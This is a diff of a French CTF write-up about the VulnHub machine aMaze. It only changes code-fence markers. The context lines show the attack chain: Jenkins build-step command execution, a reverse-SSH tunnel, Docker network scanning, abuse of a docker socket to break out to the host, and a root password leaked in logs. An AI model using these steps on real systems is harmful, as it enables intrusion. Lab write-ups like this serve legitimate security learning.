@@ -15,7 +15,7 @@ Ce challenge n'était pas assez compliqué pour être un labyrinthe (*a maze*) n
 
 Il y a malheureusement trop de CTF de ce type sur VulnHub et après plus de 115 writeups de CTF je pense être qualifié pour en parler :D  
 
-```plain
+```
 $ sudo nmap -sCV -T5 -p- 192.168.56.13
 Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-26 18:23 CET
 Nmap scan report for 192.168.56.13
@@ -68,7 +68,7 @@ Après il faut créer un nouveau projet et dans la section *Build* ajouter une �
 
 J'avais balancé une simple commande pour exfiltrer l'UID utilisateur et Jenkins n'a pas apprécié le format :  
 
-```plain
+```
 Started by user jenkins
 Building in workspace /var/jenkins_home/workspace/yolo
 [yolo] $ /bin/sh -xe /tmp/jenkins7189002743414529836.sh
@@ -110,7 +110,7 @@ chmod 755 /tmp/reverse-sshx64
 
 Une fois connecté on remarque que l'on est dans un Docker (sans quoi ce serait déjà terminé) :  
 
-```plain
+```
 root@7b5f8aa938da:/var/jenkins_home/workspace/yolo# id
 uid=0(root) gid=0(root) groups=0(root)
 root@7b5f8aa938da:/var/jenkins_home/workspace/yolo# ls -a /
@@ -124,7 +124,7 @@ En listant les fichiers dans */root* je remarque un dossier *.git* comme quoi le
 
 On peut utiliser les commandes Git pour en savoir plus...  
 
-```plain
+```
 root@7b5f8aa938da:/root# git log 
 commit e7045388b6b30739fd29f577903ab778502c4895
 Author: swapneil <swapneil.dash2@gmail.com>
@@ -173,7 +173,7 @@ Vu les méthodes employées par l'administrateur de Pastebin ces dernières ann�
 
 Heureusement celui-ci est encore présent. La clé ne nous permet cependant pas de nous connecter sur l'IP externe du CTF. On va donc fouiller un peu dans le réseau Docker.  
 
-```plain
+```
 root@7b5f8aa938da:/tmp# ./nmap -sP -T5 172.17.0.3/16
 
 Starting Nmap 7.11 ( https://nmap.org ) at 2021-12-26 17:54 UTC
@@ -191,7 +191,7 @@ Host is up.
 
 L'IP 172.17.0.1 semble correspondre en tout point à l'hôte :  
 
-```plain
+```
 PORT     STATE SERVICE
 21/tcp   open  ftp
 22/tcp   open  ssh
@@ -202,7 +202,7 @@ MAC Address: 02:42:15:88:1B:A0 (Unknown)
 
 Sur l'IP 172.17.0.2 en revanche il n'y a qu'un port SSH :  
 
-```plain
+```
 22/tcp open  ssh
 ```
 
@@ -213,7 +213,7 @@ La clé fonctionne pour ce guest et on trouve dans le dossier de *root* le binai
 
 Toutefois, la configuration par défaut ne semble pas fonctionner car le socket a été placé à un autre endroit. On peut corriger cela par une simple option.  
 
-```plain
+```
 root@a97495c67b7e:~/docker# ./docker images ls
 Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?
 
@@ -237,7 +237,7 @@ $ docker save alpine > alpine.tar
 
 J'envoie l'archive vers le premier hôte via sftp sur le tunnel *ReverseSSH* puis de là le copie avec scp sur le second Docker.  
 
-```plain
+```
 root@a97495c67b7e:~/docker# ./docker -H unix:///tmp/docker.sock load -i /tmp/alpine.tar 
 8d3ac3489996: Loading layer [==================================================>]  5.866MB/5.866MB
 Loaded image: alpine:latest
@@ -253,7 +253,7 @@ root.txt
 
 On peut aussi récupérer la clé privée de l'utilisateur *root* et enfin avoir une connexion sur l'hôte.  
 
-```plain
+```
 $ ssh -i real_amaze.key root@192.168.56.14
 Linux aMaze 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64
 
@@ -272,7 +272,7 @@ Sous le capot
 
 Sous le capot c'est plutôt brouillon. On retrouve les dockers avec un qui a du servir de test.  
 
-```plain
+```
 root@aMaze:~# docker ps -a
 CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                       PORTS                               NAMES
 22a4dfc5c4ce        alpine:latest       "/bin/sh"                2 minutes ago       Up 2 minutes                                                     wizardly_antonelli
@@ -285,7 +285,7 @@ a97495c67b7e        docker_2            "/bin/sh -c /start.sh"   29 minutes ago 
 
 Bizarrement un mot de passe root se retrouve dans les logs.
 
-```plain
+```
 root@aMaze:~# docker logs 02fe58910e11
 root login password: Ohqu8aibeij9
 /usr/lib/python2.7/dist-packages/supervisor/options.py:295: UserWarning: Supervisord is running as root and it is searching for its configuration file in default locations (including its current working directory); you probably want to specify a "-c" argument specifying an absolute path to a configuration file for improved security.
@@ -301,7 +301,7 @@ root login password: Ohqu8aibeij9
 
 On a ensuite le mystère de ce port 80... Je ne risquais pas d'y trouver quelque chose :  
 
-```plain
+```
 root@aMaze:/var/www/html1# ls -l
 total 16
 -rw-r--r-- 1 root root  697 Jan 21  2020 _Is1There2Some3Issue4With5This6File7_.php
@@ -332,7 +332,7 @@ if ($_POST['username'] == 'IamTheAdmin' &&
 
 Quant au token Github, est-il bien protégé ? Heureusement oui, si on récupère les entêtes lors d'une requête sur l'API on voit que le scope associé est en lecture uniquement :  
 
-```plain
+```
 x-oauth-scopes: read:user
 ```
 
